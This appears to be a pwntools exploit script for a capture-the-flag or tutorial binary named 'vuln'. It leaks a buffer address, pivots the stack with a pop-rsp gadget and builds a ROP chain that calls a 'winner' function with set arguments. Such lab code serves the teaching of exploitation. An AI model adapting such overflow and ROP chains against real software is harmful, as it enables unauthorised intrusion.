from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225                   # RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
    0,                 # r13
    0,                 # r14
    0,                 # r15
    POP_RDI,
    0xdeadbeef,
    POP_RSI_R15,
    0xdeadc0de,
    0x0,               # r15
    elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

payload += flat(
    POP_CHAIN,
    buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
